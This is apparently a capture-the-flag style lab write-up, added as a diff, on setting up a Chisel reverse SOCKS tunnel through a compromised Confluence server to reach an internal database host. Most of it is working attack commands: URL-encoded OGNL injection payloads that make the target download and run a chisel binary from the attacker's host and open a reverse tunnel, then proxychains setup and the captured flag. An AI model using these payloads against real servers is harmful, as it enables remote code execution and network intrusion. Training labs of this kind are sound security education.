@@ -1,0 +1,36 @@
+Questions 2
+Start VM Group 2. Download /exercises/chisel_exercise_client from CONFLUENCE01. There's a server running on port 8008 on PGDATABASE01. Set up a port forward using Chisel that allows you to run chisel_exercise_client against port 8008 on PGDATABASE01.
+Note: the source files used to build the chisel_exercise_client binary can be downloaded from /exercises/client_source.zip.
+
+# Download the payload from CONFLUENCE01
+wget http://192.168.234.63:8090/exercises/chisel_exercise_client
+
+# Inject to CONFLUENCE01 download the Chisel from our http server
+curl http://192.168.234.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.247/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
+...
+192.168.234.63 - - [06/May/2024 05:08:19] "GET /chisel HTTP/1.1" 200 -
+...
+
+# Run Chisel server
+./chisel server --port 8080 --reverse
+
+# Inject to CONFLUENCE01 execute chisel client
+curl http://192.168.234.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.247:8080%20R:socks%27%29.start%28%29%22%29%7D/
+...
+2024/05/06 05:10:46 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
+...
+
+# Sessions 1 is established to port 1080
+
+# We can utilize ProxyChains4 to use payload reach out to the PGDATABASE01
+nano /etc/proxychains4.conf
+socks5 127.0.0.1 1080
+
+chmod 755 chisel_exercise_client 
+proxychains ./chisel_exercise_client -i 10.4.234.215 -p 8008  
+...
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.4.234.215:8008  ...  OK
+Flag: "OS{2c2b527f25d3eb9adf5ffd5440767079}"
+...
+
+
